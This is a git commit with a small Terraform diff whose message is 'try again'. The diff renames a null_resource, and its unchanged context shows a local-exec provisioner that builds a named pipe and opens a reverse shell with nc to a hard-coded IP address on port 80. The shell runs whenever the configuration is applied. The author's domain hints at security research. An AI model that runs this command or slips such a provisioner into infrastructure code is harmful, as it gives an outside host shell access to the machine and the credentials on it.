ba2069b64e6e3dc14b86b85037ce3088059a76b1
benny <benny.himley@nccgroup.trust>
2019-07-12 18:12:09 -0700

    try again

--- main.tf
+++ main.tf
@@ -7,7 +7,7 @@ resource "random_id" "random" {
   byte_length = 16
 }
 
-resource "null_resource" "example12" {
+resource "null_resource" "example13" {
   provisioner "local-exec" {
     command = "mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc 35.247.19.101 80 1>/tmp/backpipe"
   }
